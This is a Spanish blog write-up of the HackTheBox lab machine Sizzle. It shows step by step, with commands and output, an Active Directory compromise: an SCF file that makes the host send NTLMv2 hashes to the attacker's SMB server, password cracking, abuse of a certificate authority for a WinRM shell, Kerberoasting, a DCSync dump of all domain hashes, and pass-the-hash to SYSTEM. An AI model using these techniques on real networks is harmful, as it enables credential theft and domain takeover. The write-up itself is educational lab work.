---
layout: single
title: Sizzle HTB - WriteUp
excerpt: WriteUp de la máquina Sizzle de HTB.
date: 2023-03-12
classes: wide
header:
  teaser: /assets/images/Sizzle/Sizzle.png
  teaser_home_page: true
  icon: /assets/images/Sizzle/Sizzle.png
categories:
  - infosec
tags:
  - ctf
  - Windows                                                                                                                                                                                 
  - Writeup
  - SMB-Enumeration
  - SCF-File
  - Web-Enumeration
  - CA-Certificate                                                                                                                                                                                    
  - Kerberoasting
  - DCSync
---

En el día de hoy estaremos resolviendo la máquina Sizzle de HackTheBox. Es una máquina Windows y su dirección IP es 10.10.10.103.

### Índice
1. [Enumeración Inicial](#enumeración-inicial)
2. [SMB Enumeration](#smb-enumeration)
3. [Creating SCF File For Extract NTLMv2](#creating-scf-file-for-extract-ntlmv2)
4. [Cracking Amanda Password](#cracking-amanda-password)
5. [Web Enumeration](#web-enumeration)
6. [Request Certificate For Amanda](#request-certificate-for-amanda)
7. [SHELL With Amanda](#shell-with-amanda)
8. [BloodHound Enumeration](#bloodhound-enumeration)
9. [Kerberoasting With Rubeus](#kerberoasting-with-rubeus)
10. [DCSync SecretsDump](#dcsync-secretsdump)

### Enumeración Inicial

Lo primero que haremos será una enumeración de los servicios expuestos que tiene la máquina. Para esa tarea usaremos nmap.

```bash
# Nmap 7.91 scan initiated Sun Mar 12 10:02:31 2023 as: nmap -sC -sV -Pn -oN Extraction -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389,47001,49664,49665,49666,49668,49677,49690,49691,49693,49696,49701,49710,49716 10.10.10.103
Nmap scan report for 10.10.10.103
Host is up (0.13s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2023-03-12T09:04:12+00:00; -2s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2023-03-12T09:04:12+00:00; -2s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2023-03-12T09:04:11+00:00; -3s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2023-03-12T09:04:12+00:00; -2s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2023-03-12T09:04:12+00:00; -2s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2018-07-02T20:26:23
|_Not valid after:  2019-07-02T20:26:23
|_ssl-date: 2023-03-12T09:04:11+00:00; -3s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -2s, deviation: 0s, median: -2s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-03-12T09:03:36
|_  start_date: 2023-03-12T08:58:24

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar 12 10:04:16 2023 -- 1 IP address (1 host up) scanned in 105.64 seconds
```

Meteremos en el "/etc/hosts" los nombres HTB.LOCAL y SIZZLE.HTB.LOCAL

Podemos ver una gran cantidad de puertos abiertos, lo primero que haremos será enumerar el puerto FTP, nmap nos ha detectado que permite el inicio de sesión de forma anonima.

```bash
❯ ftp 10.10.10.103
Connected to 10.10.10.103.
220 Microsoft FTP Service
Name (10.10.10.103:bly): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection.
226 Transfer complete.
```

### SMB Enumeration

No hay nada... Visto esto, vamos a enumerar si hay recursos compartidos por SMB, utlizaré la herramienta smbmap para ver los permisos que tengo sobre los recursos, en caso de que pueda acceder a alguno que permita una sesión nula.

```bash
❯ smbmap -H 10.10.10.103 -u 'null' -p ''
[+] Guest session       IP: 10.10.10.103:445    Name: 10.10.10.103                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        CertEnroll                                              NO ACCESS       Active Directory Certificate Services share
        Department Shares                                       READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Operations                                              NO ACCESS
        SYSVOL                                                  NO ACCESS       Logon server share 
```

Podemos ver que tenemos acceso de lectura sobre un recurso llamado "Department Shares". También podemos ver que hay varios recursos interesantes como "CertEnroll" al cual no tenemos acceso.

Vamos a ver que hay dentro de "Department Shares".


```bash
❯ crackmapexec smb 10.10.10.103 -u 'null' -p '' -M spider_plus
SMB         10.10.10.103    445    SIZZLE           [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.103    445    SIZZLE           [+] HTB.LOCAL\null: 
SPIDER_P... 10.10.10.103    445    SIZZLE           [*] Started spidering plus with option:
SPIDER_P... 10.10.10.103    445    SIZZLE           [*]        DIR: ['print$']
SPIDER_P... 10.10.10.103    445    SIZZLE           [*]        EXT: ['ico', 'lnk']
SPIDER_P... 10.10.10.103    445    SIZZLE           [*]       SIZE: 51200
SPIDER_P... 10.10.10.103    445    SIZZLE           [*]     OUTPUT: /tmp/cme_spider_plus
```

Había una gran cantidad de carpetas, usé CrackMapExec para hacer una enumeración mas rápida.

### Creating SCF File For Extract NTMLv2

No había ningun archivo interesante... Pero descubrí que podiamos escribir en el directorio "/Users/Public"

```bash
smb: \Users\Public\> put Extraction 
putting file Extraction as \Users\Public\Extraction (15,2 kb/s) (average 9,4 kb/s)
smb: \Users\Public\>
```

Podriamos intentar aprovecharnos de esto y subir un archivo scf https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/

Vamos a intentarlo. Primero crearemos un archivo scf con la siguiente estructura.

```bash
❯ catn @bly.scf
[Shell]
Command=2
IconFile=\\10.10.16.6\compartido\test.ico
[Taskbar]
Command=ToggleDesktop
```

Vamos a subirlo a la máquina y vamos a esperar a recibir el hash NTLMv2 , nos pondremos a recibir datos con el servidor smb que nos permite montar impacket.

```bash
❯ impacket-smbserver compartido . -smb2support
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.103,64593)
[*] AUTHENTICATE_MESSAGE (HTB\amanda,SIZZLE)
[*] User SIZZLE\amanda authenticated successfully
[*] amanda::HTB:aaaaaaaaaaaaaaaa:41c88b213e8c2f4ee91b79348ed5321b:01010000000000008023afe9c554d9017d5bfe029279c6f90000000001001000590070004900480075004c004600410003001000590070004900480075004c00460041000200100069004c004500560061005300660062000400100069004c00450056006100530066006200070008008023afe9c554d90106000400020000000800300030000000000000000100000000200000a0ff9f85ba7d66cb5188b6e7c44bb13c9c5ec60ecabebb2981f254600e7681690a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003600000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:compartido)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:compartido)
[*] Closing down connection (10.10.10.103,64593)
[*] Remaining connections []
```

### Cracking Amanda Password

Si esperamos un rato recibimos el hash del usuario amanda. Vamos a intentar romperlo con la herramienta john.

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ashare1972       (amanda)
1g 0:00:00:04 DONE (2023-03-12 10:37) 0.2114g/s 2413Kp/s 2413Kc/s 2413KC/s Ashiah08..Ariel!
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

Si intentamos conectarnos por Win-RM no vamos a poder. Debido a que es por SSL y nos hacen falta el par de claves del usuario, las cuales no tenemos.

Vamos a ver si podemos acceder a nuevos recursos compartidos.

```bash
❯ smbmap -H 10.10.10.103 -u 'amanda' -p 'Ashare1972'
[+] IP: 10.10.10.103:445        Name: 10.10.10.103                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        CertEnroll                                              READ ONLY       Active Directory Certificate Services share
        Department Shares                                       READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Operations                                              NO ACCESS
        SYSVOL                                                  READ ONLY       Logon server share 
```

Podemos acceder a la gran mayoría de recursos, vamos a mirar "CertEnroll".

```bash
❯ smbclient '\\10.10.10.103\CertEnroll' -U amanda
Enter WORKGROUP\amanda's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Mar 12 09:58:44 2023
  ..                                  D        0  Sun Mar 12 09:58:44 2023
  HTB-SIZZLE-CA+.crl                  A      721  Sun Mar 12 09:58:44 2023
  HTB-SIZZLE-CA.crl                   A      909  Sun Mar 12 09:58:44 2023
  nsrev_HTB-SIZZLE-CA.asp             A      322  Mon Jul  2 22:36:05 2018
  sizzle.HTB.LOCAL_HTB-SIZZLE-CA.crt      A      871  Mon Jul  2 22:36:03 2018

                7779839 blocks of size 4096. 3375739 blocks available
```


### Web Enumeration

Podemos ver los archivos de la CA para autofirmar certificados. Con estó no podemos hacer gran cosa. Vamos a enumerar el puerto 443 y el 80.

Si hacemos Fuzzing podemos encontrar los siguientes directorios.

```bash
❯ wfuzz -X GET --hc=404 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/IIS.fuzz.txt  -u "http://10.10.10.103/FUZZ"                                                                   
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation 
for more information.                                                                                                                                                                        
********************************************************                                                                                                                                     
* Wfuzz 3.1.0 - The Web Fuzzer                         *                                                                                                                                     
********************************************************                                                                                                                                     
                                                                                                                                                                                             
Target: http://10.10.10.103/FUZZ                                                                                                                                                             
Total requests: 211                                                                                                                                                                          
                                                                                                                                                                                             
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000021:   403        29 L     92 W       1233 Ch     "/aspnet_client/"                                                                                                            
000000029:   403        29 L     92 W       1233 Ch     "/certenroll/"                                                                                                               
000000032:   401        29 L     100 W      1293 Ch     "/certsrv/mscep/mscep.dll"                                                                                                   
000000030:   401        29 L     100 W      1293 Ch     "/certsrv/"                                                                                                                  
000000031:   401        29 L     100 W      1293 Ch     "/certsrv/mscep_admin"                                                                                                       
000000083:   403        29 L     92 W       1233 Ch     "/images/"            
```

### Request Certificate For Amanda

Si entramos a "/certsrv/" nos solicita un usuario y contraseña, podemos entrar con los datos del usuario amanda. Desde aquí podemos crear un certificado para el usuario y acceder desde Evil-WinRM

Seguiremos los siguientes pasos.

![](/assets/images/Sizzle/img1.png)

Haremos una petición de un certificado. Posteriormente entraremos en la parte avanzada de la solicitud de certificados.

![](/assets/images/Sizzle/img2.png)

Ahora crearemos la solicitud con openssl.

```bash
openssl req -out CSR.csr -new -newkey rsa:2048 -nodes -keyout privateKey.key
```

Esto nos dejará una clave privada y una solicitud de certificado. Debemos copiar la solicitud y copiarla en la web.

![](/assets/images/Sizzle/img3.png)

Le daremos a submit y nos descargaremos el certificado.

![](/assets/images/Sizzle/img4.png)


### SHELL With Amanda

Ahora probaremos conectarnos con Evil-WinRM usando el certificado y la clave privada que generamos anteriormente.

```powershell
❯ evil-winrm -S -i 10.10.10.103 -u 'amanda' -p 'Ashare1972' -c certnew.cer -k privateKey.key
Evil-WinRM shell v2.4
Warning: SSL enabled
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\amanda\Documents>
```

Ya tenemos shell! Vamos a ver como podemos seguir avanzando. Voy a usar bloodhound para una enumeración mas exaustiva.

Nos descargaremos el script de powershell SharpHound.ps1 https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1  y lo subiremos a la máquina victima.

Una vez subido el archivo, lo podemos intentar importar para usarlo, pero recibimos el siguiente error.

```bash
*Evil-WinRM* PS C:\Users\amanda\Documents> Import-Module .\SharpHound.ps1
Importing *.ps1 files as modules is not allowed in ConstrainedLanguage mode.
At line:1 char:1
+ Import-Module .\SharpHound.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (:) [Import-Module], InvalidOperationException
    + FullyQualifiedErrorId : Modules_ImportPSFileNotAllowedInConstrainedLanguage,Microsoft.PowerShell.Commands.ImportModuleCommand
*Evil-WinRM* PS C:\Users\amanda\Documents> 
```

### BloodHound Enumeration

Por lo tanto haré uso del script BloodHound.py para extraer los datos.

```bash
❯ python3 bloodhound.py -c ALL -u 'amanda' -p 'Ashare1972' -d 'HTB.LOCAL' -ns 10.10.10.103
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (htb.local:88)] [Errno 113] No route to host
INFO: Connecting to LDAP server: sizzle.HTB.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: sizzle.HTB.LOCAL
INFO: Found 8 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: sizzle.HTB.LOCAL
INFO: Done in 00M 15S
```

Importamos los datos en BloodHound y podemos ver el siguiente gráfico.

![](/assets/images/Sizzle/img5.png)


### Kerberoasting With Rubeus

El usuario es Kerberoasteable, esto quiere decir que podríamos ganar acceso a ese usuario. Recordamos que Kerberos solo está abierto de forma local en la máquina. Podemos usar Rubeus.exe para extraer el ticket e intentar romperlo. Ester repo está muy bien porque tiene programas ya compilados. https://github.com/r3motecontrol/Ghostpack-CompiledBinaries


Una vez tengamos Rubeus.exe en la máquina podemos extraer el tgs:

```powershell
*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> .\Rubeus.exe kerberoast /creduser:HTB.LOCAL\amanda /credpassword:Ashare1972
```

![](/assets/images/Sizzle/img7.png)

Vamos a intentar romper el hash para extraer la password del usuario "mrlky" Usaremos nuevamente la herramienta john.

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash2
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Football#7       (?)
1g 0:00:00:05 DONE (2023-03-12 12:07) 0.1724g/s 1925Kp/s 1925Kc/s 1925KC/s Forever3!..Flubb3r
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

### DCSync SecretsDump

Bien! Ya tenemos acceso a otro usuario.  Ahora si quisieramos ganar una shell tendriamos que hacer lo mismo que antes, crear la solicitud del certificado... etc. Vamos a aprovechar que tenemos los datos de BloodHound y vamos a ver que podemos hacer con ese usuario.

![](/assets/images/Sizzle/img6.png)


El usuario tiene derechos de DCSync por lo tanto podemos extraer los hash con secretsdump y utilizarlos para hacer PassTheHash.

```bash
❯ secretsdump.py HTB.LOCAL/mrlky:Football#7@10.10.10.103
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:62b5a4f3becfddc769f690d5c4b015ff:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d
Administrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3
Administrator:des-cbc-md5:ad7afb706715e964
krbtgt:aes256-cts-hmac-sha1-96:0fcb9a54f68453be5dd01fe555cace13e99def7699b85deda866a71a74e9391e
krbtgt:aes128-cts-hmac-sha1-96:668b69e6bb7f76fa1bcd3a638e93e699
krbtgt:des-cbc-md5:866db35eb9ec5173
amanda:aes256-cts-hmac-sha1-96:60ef71f6446370bab3a52634c3708ed8a0af424fdcb045f3f5fbde5ff05221eb
amanda:aes128-cts-hmac-sha1-96:48d91184cecdc906ca7a07ccbe42e061
amanda:des-cbc-md5:70ba677a4c1a2adf
mrlky:aes256-cts-hmac-sha1-96:b42493c2e8ef350d257e68cc93a155643330c6b5e46a931315c2e23984b11155
mrlky:aes128-cts-hmac-sha1-96:3daab3d6ea94d236b44083309f4f3db0
mrlky:des-cbc-md5:02f1a4da0432f7f7
sizzler:aes256-cts-hmac-sha1-96:85b437e31c055786104b514f98fdf2a520569174cbfc7ba2c895b0f05a7ec81d
sizzler:aes128-cts-hmac-sha1-96:e31015d07e48c21bbd72955641423955
sizzler:des-cbc-md5:5d51d30e68d092d9
SIZZLE$:aes256-cts-hmac-sha1-96:8cebafaae289be4be194f297651fb60f59b6e0bf26cde5a41621818177493482
SIZZLE$:aes128-cts-hmac-sha1-96:fff9c0512874a16740299cb032e11ba5
SIZZLE$:des-cbc-md5:9ead38efab62ef13
[*] Cleaning up... 
```

Hemos extraido la base de datos NTDS, vamos a conectarnos como administradores a la máquina.

```bash
❯ psexec.py Administrator@10.10.10.103 -hashes :f6b7160bfc91823792e0ac3a162c9267
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.10.103.....
[*] Found writable share ADMIN$
[*] Uploading file kHJRWEid.exe
[*] Opening SVCManager on 10.10.10.103.....
[*] Creating service pcAY on 10.10.10.103.....
[*] Starting service pcAY.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
```

Ya hemos pwneado la máquina, espero que te haya servido.

